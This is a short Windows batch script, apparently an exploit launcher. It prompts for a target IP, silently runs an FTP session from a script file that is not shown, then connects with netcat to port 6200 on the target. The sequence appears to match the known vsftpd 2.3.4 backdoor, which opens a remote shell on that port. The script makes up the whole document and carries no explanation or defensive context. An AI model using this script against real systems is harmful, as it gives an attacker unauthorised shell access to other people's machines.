@echo off
color 1F
set /p ip="Enter Target IP Address: "
start /min ftp -s:ftp.txt %ip%
timeout /t 2 >nul
nc %ip% 6200
